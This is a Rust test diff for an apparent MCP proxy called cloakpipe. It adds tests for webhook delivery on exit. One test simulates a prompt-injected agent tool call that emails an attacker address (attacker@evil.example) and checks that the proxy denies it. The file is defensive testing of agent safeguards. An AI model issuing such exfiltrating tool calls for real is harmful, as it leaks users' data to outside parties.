@@ -6,7 +6,7 @@
 #[path = "../../cloakpipe-mcp/tests/support/receiver.rs"]
 mod receiver;
 
-use receiver::{closed_port, Receiver};
+use receiver::{black_hole, closed_port, Receiver};
 use serde_json::{json, Value};
 use std::io::Write;
 use std::path::{Path, PathBuf};
@@ -308,4 +308,51 @@ fn a_failed_anchor_is_an_anchor_failed_event() {
     assert_eq!(e["release"], "support-agent", "{e}");
     assert!(e["ledger_seq"].is_u64(), "the epoch's last entry: {e}");
     assert!(e["fingerprint"].as_str().unwrap().starts_with("sha256:"), "{e}");
+}
+
+#[test]
+fn a_stdio_gate_waits_for_a_hung_webhook_once_on_exit() {
+    // A receiver that accepts and never answers: every delivery hangs.
+    let url = format!("{}/hook", black_hole());
+    let dir = tempfile::tempdir().unwrap();
+    let started = std::time::Instant::now();
+    let (code, msgs, err) = example_proxy(dir.path(), &strings(&["--webhook", &url]), &[], &example_2());
+    let took = started.elapsed();
+    assert_eq!(code, 0, "{err}");
+    assert_eq!(msgs.len(), 3, "decisions are not held up: {msgs:?}");
+    // One flush of at most EVENT_FLUSH (5 s), not one per layer.
+    assert_eq!(err.matches("still delivering").count(), 1, "{err}");
+    assert!(took < Duration::from_secs(9), "exit took {took:?}: {err}");
+}
+
+#[test]
+fn a_stdio_gate_in_front_of_an_http_upstream_delivers_its_events_before_exit() {
+    // Two failures first: the deny is delivered on the third try, ~1.5 s in.
+    let rx = Receiver::start(&[500, 500]);
+    let dir = tempfile::tempdir().unwrap();
+    let extra = strings(&["--upstream-url", &format!("{}/mcp", closed_port()), "--webhook", &rx.url("/hook")]);
+    let mut cmd = bin();
+    cmd.current_dir(dir.path())
+        .args(["mcp-proxy", "--manifest", &example("cloakpipe.manifest.yaml")])
+        .args(["--task-context", &example("task-context.json")])
+        .args(["--operations-db", &dir.path().join("ops.db").to_string_lossy()])
+        .args(&extra)
+        .env("CLOAKPIPE_HOME", dir.path().join("home"))
+        .env_remove("CLOAKPIPE_STATE_DB")
+        .env_remove("CLOAKPIPE_SIGNING_KEY")
+        .env_remove("CLOAKPIPE_RELEASE")
+        .env_remove("CLOAKPIPE_TASK_CONTEXT")
+        .env_remove("CLOAKPIPE_OPERATIONS_DB")
+        .env_remove("CLOAKPIPE_LEDGER_DB");
+    let mut child = cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
+    let injected = tool_call(3, "send_email", email("attacker@evil.example"));
+    child.stdin.take().unwrap().write_all(format!("{injected}\n").as_bytes()).unwrap();
+    let out = child.wait_with_output().unwrap();
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert_eq!(out.status.code(), Some(0), "{err}");
+    assert!(String::from_utf8_lossy(&out.stdout).contains("scope_mismatch"), "{err}");
+    // Delivered before the gate exited: nothing arrives after it.
+    let got = rx.requests();
+    assert_eq!(got.len(), 3, "the third try was delivered before exit: {got:?}\n{err}");
+    assert_eq!(got[2].header("cloakpipe-event"), Some("decision.deny"));
 }
